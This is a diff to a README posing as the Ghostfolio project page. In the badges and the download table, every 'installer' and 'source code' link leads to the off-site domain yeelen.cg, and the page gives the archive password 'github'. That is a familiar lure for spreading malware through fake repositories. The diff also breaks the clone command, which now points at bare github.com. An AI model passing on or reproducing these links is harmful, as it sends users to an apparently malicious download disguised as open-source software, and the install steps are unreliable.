@@ -5,13 +5,13 @@
 </p>
 
 <p align="center">
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
+  <a href="https://yeelen.cg"><img src="https://shields.io" alt="Download Release"></a>
+  <a href="https://yeelen.cg"><img src="https://shields.io" alt="Build Status"></a>
+  <a href="https://yeelen.cg"><img src="https://shields.io" alt="License"></a>
 </p>
 
 <p align="center">
-  <a href="https://yeelen.cg"><strong> Download Application</strong></a> •
+  <a href="https://yeelen.cg"><strong>Download Application</strong></a> •
   <a href="#-key-features">Key Features</a> •
   <a href="#-system-requirements">Requirements</a> •
   <a href="#-installation--deployment">Installation</a> •
@@ -34,9 +34,9 @@ Get the latest build or source files directly using the links below:
 
 | Download Option | Format | Quick Link |
 | :--- | :--- | :--- |
-| **Complete Application Package** | Executable / Archive |  **[Download Installer](https://yeelen.cg/gh/)** |
-| **Source Code (Latest)** | `.ZIP` Archive |  **[Download Source (.zip)](https://yeelen.cg/gh/)** |
-| **Source Code (Tarball)** | `.TAR.GZ` Archive |  **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
+| **Complete Application Package** | Executable / Archive | **[Download Installer](https://yeelen.cg)** |
+| **Source Code (Latest)** | `.ZIP` Archive | **[Download Source (.zip)](https://yeelen.cg)** |
+| **Source Code (Tarball)** | `.TAR.GZ` Archive | **[Download Source (.tar.gz)](https://yeelen.cg)** |
 
 >  **Archive Password:** `github`
 
@@ -88,7 +88,7 @@ Deploy Ghostfolio locally or on your NAS/VPS using Docker Compose:
 
 ```bash
 # 1. Clone the repository
-git clone [https://github.com](https://github.com)
+git clone https://github.com
 
 # 2. Navigate to project root
 cd ghostfolio
